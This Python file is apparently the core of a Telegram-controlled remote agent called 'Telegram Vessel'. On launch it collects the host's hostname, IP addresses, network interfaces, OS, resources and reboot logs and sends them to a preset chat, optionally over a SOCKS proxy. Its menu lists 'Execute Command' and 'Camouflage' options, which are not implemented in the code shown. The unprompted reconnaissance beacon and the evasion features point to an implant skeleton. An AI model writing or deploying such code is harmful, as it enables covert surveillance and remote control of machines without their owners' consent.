import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application, CommandHandler, ContextTypes, ConversationHandler,
    MessageHandler, PicklePersistence, filters, CallbackContext
)
from telegram.request import HTTPXRequest
from utils.config import BOT_TOKEN, CHAT_ID, SOCKS_PROXY
from utils.system_info import gather_system_info

logger = logging.getLogger(__name__)

CHOOSING, TYPING_REPLY, TYPING_CHOICE = range(3)

reply_keyboard = [
    ["System Info", "Execute Command"],
    ["Enable Camouflage", "Disable Camouflage"],
    ["Done"],
]
markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)

def setup_bot():
    persistence = PicklePersistence(filepath="telegram_vessel")
    request = HTTPXRequest(proxy=SOCKS_PROXY, connection_pool_size=10, pool_timeout=5.0) if SOCKS_PROXY else None
    application = Application.builder().token(BOT_TOKEN).request(request).persistence(persistence).build()
    
    application.job_queue.run_once(send_system_info, 1, chat_id=CHAT_ID)

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSING: [MessageHandler(filters.Regex("^(System Info|Execute Command)$"), start)],
            TYPING_REPLY: [MessageHandler(filters.TEXT & ~filters.COMMAND, echo)],
        },
        fallbacks=[CommandHandler("done", done)],
        name="my_conversation",
        persistent=True,
    )
    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

async def send_system_info(context: CallbackContext) -> None:
    chat_id = context.job.chat_id
    info = gather_system_info()
    logger.info(f"System Info: {info}")
    
    message = (
        f"🔔 *Telegram Vessel is now running*\n\n"
        f"*Hostname:* {info['Hostname']}\n"
        f"*IP Address:* {info['IP Address']}\n"
        f"*OS:* {info['OS']}\n"
        f"*OS Version:* {info['OS Version']}\n"
        f"*Architecture:* {info['Architecture']}\n"
        f"*Processor:* {info['Processor']}\n"
        f"*Python Version:* {info['Python Version']}\n\n"
        f"*Memory Info:*\n"
        f"  - Total Memory: {info['Total Memory']}\n"
        f"  - Available Memory: {info['Available Memory']}\n"
        f"  - Used Memory: {info['Used Memory']}\n"
        f"  - Memory Usage: {info['Memory Usage']}\n\n"
        f"*Disk Info:*\n"
        f"  - Total Disk Space: {info['Total Disk Space']}\n"
        f"  - Used Disk Space: {info['Used Disk Space']}\n"
        f"  - Free Disk Space: {info['Free Disk Space']}\n"
        f"  - Disk Usage: {info['Disk Usage']}\n\n"
        f"*Network Interfaces:*\n"
    )
    for iface, ip in info['Network Interfaces'].items():
        message += f"  - {iface}: {ip}\n"
    message += (
        f"\n*System Uptime:* {info['System Uptime']}\n"
        f"*Last Boot Time:* {info['Last Boot Time']}\n\n"
        f"*Last Reboot Logs:*\n"
        f"{info['Last Reboot Logs']}"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    logger.info("Detailed system information sent to the user.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    chat_id = update.effective_chat.id
    logger.info(f"Received /start command from user: {update.effective_user.username} in chat {chat_id}")
    
    await update.message.reply_text("Hi! I'm ready to assist you. What would you like to do?", reply_markup=markup)
    context.job_queue.run_once(send_system_info, 1, chat_id=chat_id)
    return CHOOSING

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.info(f"Received message: {update.message.text} from {update.effective_user.username}")
    await update.message.reply_text(update.message.text)

async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Goodbye! Use /start to begin again.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END
